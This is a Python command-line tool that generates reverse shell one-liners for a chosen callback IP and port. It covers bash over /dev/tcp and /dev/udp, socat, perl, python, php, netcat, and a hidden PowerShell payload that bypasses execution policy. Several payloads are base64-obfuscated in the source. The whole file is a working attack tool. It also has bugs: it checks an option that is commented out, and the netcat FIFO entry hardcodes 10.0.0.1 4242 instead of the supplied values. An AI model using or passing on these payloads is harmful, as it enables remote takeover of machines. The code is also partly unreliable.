#!/usr/bin/python3
import argparse
from colorama import Back,Style
import os
import random
import re
import string
import subprocess
from base64 import b64decode as bd
from base64 import b64encode as be


def main():
    global args
    parser = argparse.ArgumentParser("Quick and easy, searchable reverse shell generator")
    parser.add_argument("-b","--base64",help="Encode the payload in base64",action="store_true")
    parser.add_argument("-p","--port",help="Callback port",type=int)
    parser.add_argument("-i","--ip",help="Callback ip",type=str)
    parser.add_argument("-l","--list",help="Print available reverse shell commands",action="store_true")
    parser.add_argument("-s","--search",help="Print specific comma separated list of reverse shells (number or name). Use -l to list available shells")
    g = parser.add_mutually_exclusive_group()
    g.add_argument("-P",help="Print reverse shell cheatsheet instead of generating files",action="store_true")
    #g.add_argument("-m",help="Run an interactive menu instead of generating files",action="store_true")
    args = parser.parse_args()

    if args.list:
        print_list()
        exit(0)

    if not args.ip:
        result = subprocess.check_output(["ip", "a","sh","eth0"])
        r = re.search(r"([0-9\.]{7,})",str(result))
        ip_addr = r.groups()[0]
    else:
        ip_addr = args.ip

    if not args.port:
        port = random.randint(8000,65535)
    else:
        port = args.port

    if args.m:
        menu()
    else:
        shells(ip_addr,port)

def wrap(m):
    return Back.MAGENTA+m+Style.RESET_ALL

def print_list():
    for count,shell in enumerate(rev_shell_cheat):
        print(str(count)+": "+shell[0])

def shells(ip_addr,port):
    global args

    if args.search:
        print_list = args.search.split(',')
        index = 0
        for i in rev_shell_cheat:
            if args.search:
                if i[0] in print_list or str(index) in print_list:
                    print(wrap(i[0])+":\n"+fsh(i[1].format(ip_addr,port))+"\n")
            index+=1

    elif not args.P:
        try:
            os.mkdir("./rev_shells")
        except OSError as e:
            if "File exists" in str(e):
                pass
            else:
                raise(e)
        with open("./rev_shells/cheat_sheet","w") as f:
            for i in rev_shell_cheat:
                f.write(i[0]+":\n"+fsh(i[1].format(ip_addr,port))+"\n")
    else:
        for i in rev_shell_cheat:
            print(wrap(i[0])+":\n"+fsh(i[1].format(ip_addr,port))+"\n")
                
def fsh(m):
    global args
    if args.base64:
        return be(bytes(m,'utf-8')).decode()
    else:
        return m

def menu():
    pass



###################### Data for Shells #######################################

rand_file = "."+''.join([random.choice(string.ascii_lowercase) for i in range(0,4)])
rev_shell_cheat = [("bash","bash -i >& /dev/tcp/{0}/{1} 0>&1"),
        ("bash_udp","sh -i >& /dev/udp/{0}/{1} 0>&1"),
        ("socat","socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{0}:{1}"),
        ("perl",bd("cGVybCAtZSAndXNlIFNvY2tldDskaT0iezB9IjskcD17MX07c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe3tvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9fTsnDQo=").decode()),
        ("python",bd("cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiezB9Iix7MX0pKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCIvYmluL2Jhc2giKScNCg==").decode()),
        ("php","php -r '$sock=fsockopen(\"{0}\",{1});$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"),
        ("nc_old","nc -e /bin/sh {0} {1}"),
        ("nc_new","rm /tmp/"+rand_file+";mkfifo /tmp/"+rand_file+";cat /tmp/"+rand_file+"|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/"+rand_file),
        ("powershell",bd("cG93ZXJzaGVsbCAtTm9QIC1Ob25JIC1XIEhpZGRlbiAtRXhlYyBCeXBhc3MgLUNvbW1hbmQgTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCJ7MH0iLHsxfSk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwle3swfX07d2hpbGUoKCRpID0gJHN0cmVhbS5SZWFkKCRieXRlcywgMCwgJGJ5dGVzLkxlbmd0aCkpIC1uZSAwKXt7OyRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOyRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTskc2VuZGJhY2syICA9ICRzZW5kYmFjayArICJQUyAiICsgKHB3ZCkuUGF0aCArICI+ICI7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfX07JGNsaWVudC5DbG9zZSgpDQo=").decode())]
rev_shell_cheat.sort()


####################################
if __name__ == '__main__':
    main()

